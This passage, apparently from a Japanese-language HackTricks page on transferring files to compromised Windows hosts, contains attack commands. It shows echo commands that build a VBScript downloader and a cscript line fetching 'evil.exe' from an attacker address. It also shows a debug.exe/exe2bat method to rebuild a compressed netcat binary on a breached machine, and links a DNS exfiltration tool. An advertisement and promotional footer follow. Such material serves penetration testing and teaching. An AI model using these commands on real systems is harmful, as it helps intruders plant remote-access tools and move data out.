echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

これはWindows 32ビットマシンで動作するクレイジーなテクニックです。アイデアは、`debug.exe`プログラムを使用することです。これはデバッガのようにバイナリを検査するために使用されます。しかし、それはまた、16進数からバイナリを再構築することもできます。したがって、アイデアは、`netcat`のようなバイナリを取り、それを16進数に逆アセンブルし、それを侵害されたマシン上のファイルに貼り付け、そして`debug.exe`でアセンブルすることです。

`Debug.exe`は64 KBしかアセンブルできません。したがって、それよりも小さいファイルを使用する必要があります。さらに、それをさらに圧縮するためにupxを使用することができます。それでは、以下のようにしましょう：
```
upx -9 nc.exe
```
今ではわずか29 kbしかありません。完璧です。では、それを分解しましょう：
```
wine exe2bat.exe nc.exe nc.txt
```
今、テキストをWindowsシェルにコピーして貼り付けるだけです。すると、自動的にnc.exeという名前のファイルが作成されます。

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて、より速く修正できます。Intruderは攻撃対象を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリまで、クラウドシステム全体にわたる問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
